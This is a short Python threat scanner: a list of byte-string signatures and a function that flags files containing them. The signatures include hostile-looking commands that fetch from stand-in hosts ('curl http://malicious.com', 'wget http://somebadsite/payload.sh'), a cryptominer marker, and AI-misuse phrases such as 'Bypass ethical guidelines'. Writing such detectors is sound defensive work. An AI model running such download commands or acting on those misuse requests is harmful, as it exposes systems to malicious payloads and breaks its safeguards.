# Expanded threat signatures
KNOWN_SIGNATURES = [
    b"curl http://malicious.com",          # Malicious command injection
    b"MINER_START",                        # Hypothetical cryptominer
    b"wget http://somebadsite/payload.sh", # Malicious file download
    # AI-Specific Threats
    b"Generate fake news",
    b"Assist in hacking",
    b"Bypass ethical guidelines",
]

def run_threat_signature_check(file_path, data):
    """
    Scans code or binary data for known malicious signatures.
    'data' can be either text or bytes. Convert if needed.
    """
    warnings = []

    # Convert text to bytes for consistent scanning
    if isinstance(data, str):
        data = data.encode("utf-8", errors="ignore")

    for sig in KNOWN_SIGNATURES:
        if sig in data:
            warnings.append(f"⚠️ Known malicious signature found in {file_path}: {sig.decode('utf-8', 'ignore')}")

    return warnings
